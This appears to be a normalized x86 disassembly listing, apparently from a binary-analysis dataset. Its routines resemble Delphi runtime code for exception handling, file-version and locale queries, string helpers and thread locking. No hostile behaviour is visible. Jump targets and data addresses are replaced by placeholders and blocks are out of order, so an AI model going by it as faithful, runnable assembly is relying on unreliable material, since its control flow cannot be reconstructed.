jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bac4
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bc7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404258
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4085cc
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc86
lea eax [ ebp - 0x170 ]
call sub_403fe8
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_40400c
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40bc90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bd4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ba2c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b668
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
push ebp
call sub_40bac4
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd52
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
mov ebx eax
sub_40bd6c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bd5c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40baac
mov eax [ rw-data ]
mov [ eax ] sub_40bc90
mov eax sub_40b9f8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ba14
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bdf0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403270
xor eax eax
mov [ rw-data ] eax
sub_40be70
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404258
sub_40bf00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bfd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404080
lea eax [ ebp - 0x8 ]
call j_sub_4044b4#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044a8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfdd
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov eax ebx
call sub_4026f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bfb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044a8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402714
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bfec
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c064
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4044a8
mov edx esi
dec edx
call sub_40bfec
sub_40c0a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4042a8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c0c8
pop esi
pop ebx
retn
mov eax ebx
call sub_4042a8
mov esi eax
sub_40c0c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4042a8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c2d8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c120
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4042a8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c2d8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c2d8
dec eax
mov ebx eax
sub_40c1b0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042a8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c120
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4042a8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c214
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042a8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4042a8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c120
mov eax esi
call sub_4042a8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4042a8
mov [ esp ] eax
jmp r-xdata
sub_40c29c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4044a8
add eax esi
dec eax
call sub_40c274
sub_40c2d8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4044a8
add eax ebx
dec eax
call sub_40c274
add eax ebx
sub_40c314
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4044a8
push eax
mov eax esi
call sub_4044a8
mov ebp eax
mov eax ebp
pop edx
call sub_40c34c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c34c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4086b4
mov [ esp ] eax
mov eax ebp
call sub_4086b4
mov edi eax
mov edx ebp
mov eax esi
call sub_408878
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c088
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408878
mov ebx eax
inc ebx
sub_40c3ec
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c414
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c414
test eax eax
jne r-xdata
sub_40c414
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408864
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c088
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408864
mov edi eax
test edi edi
jne r-xdata
sub_40c454
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c4b8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404258
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408224
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c4bf
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_40c4c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c454
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c540
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c528
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c4c8
pop ecx
push ebp
call sub_40c4c8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402da8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c6b4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c97f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c540
call sub_40af50
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40aea0
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40403c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408224
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408224
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40aeec
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40aeec
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408224
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40aeec
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b1d8
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_40403c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b1d8
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_40403c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40aeec
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40aea0
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_40403c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40aea0
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_40403c
lea eax [ ebp - 0x8 ]
call sub_403fe8
lea eax [ ebp - 0xc ]
call sub_403fe8
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408224
test eax eax
jne r-xdata
call sub_40b128
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404080
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404080
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404368
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404368
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40aeec
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c986
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_40400c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408224
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408224
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404080
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404080
jmp r-xdata
sub_40ca34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cac4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ae54
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cacb
lea eax [ ebp - 0x14 ]
call sub_403fe8
retn
sub_40cb1c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408640
mov [ rw-data ] eax
sub_40cba0
push ebx
push esi
push edi
push ebp
call sub_403624
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402714
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403260
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
sub_40cc08
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cbf0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cc90
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407d40
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cb90
mov [ ebp ] eax
sub_40cc90
push ebx
mov ebx eax
mov eax ebx
call sub_40cbf0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cb90
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40ccd0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_40cd44
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_40cdd0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403270
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_40cdd0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cd8c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cc08
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cb98
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cb78
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cb98
test eax eax
je r-xdata
mov eax edi
call sub_40cd8c
test bl bl
je r-xdata
mov eax edi
call sub_40cdc0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cb78
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cb84
sub_40ce6c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc08
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cb98
mov eax ebx
call sub_40cda4
mov eax ebx
call sub_40cd98
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc80
sub_40cebc
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cc08
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cdb0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cb84
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cb78
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cdb0
mov eax esi
call sub_40cda4
sub_40cf28
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc08
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc80
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cb78
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cda4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cda4
sub_40cfa0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
